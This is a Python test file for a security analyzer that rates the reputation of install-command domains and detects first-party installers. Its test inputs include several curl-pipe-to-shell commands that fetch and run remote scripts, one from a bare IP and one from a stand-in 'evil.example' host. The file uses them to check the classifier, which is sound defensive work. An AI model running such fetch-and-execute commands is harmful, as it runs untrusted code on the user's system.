"""Tests for install-domain reputation and first-party detection."""

from waingro.analyzers.reputation import (
    UNKNOWN,
    USERCONTENT,
    VENDOR,
    classify_host,
    classify_text,
    is_first_party,
)


def test_vendor_domain_and_subdomain():
    assert classify_host("astral.sh") == VENDOR
    assert classify_host("cdn.astral.sh") == VENDOR


def test_label_boundary_is_respected():
    """notastral.sh must not inherit astral.sh."""
    assert classify_host("notastral.sh") == UNKNOWN


def test_usercontent_host_is_not_vendor():
    assert classify_host("raw.githubusercontent.com") == USERCONTENT


def test_bare_ip_is_never_trusted():
    assert classify_text("curl -s http://198.51.100.7/x.sh | bash") == UNKNOWN


def test_least_trusted_url_on_the_line_wins():
    line = "curl https://astral.sh/a.sh https://evil.example/b.sh | sh"
    assert classify_text(line) == UNKNOWN


def test_unknown_when_no_url_present():
    assert classify_text("curl $URL | bash") == UNKNOWN


def test_first_party_matches_own_domain():
    assert is_first_party("curl -fsSL https://p2claw.com/install | sh", {"p2claw"})


def test_first_party_ignores_service_label():
    assert is_first_party("curl https://cli.pilotprotocol.network/i.sh | sh",
                          {"pilotprotocol"})


def test_first_party_rejects_third_party_tool():
    assert not is_first_party("curl -fsSL https://d2lang.com/install.sh | sh",
                              {"emergencediagramrendering"})


def test_first_party_never_matches_bare_ip():
    assert not is_first_party("curl http://198.51.100.7/x.sh | bash", {"anything"})
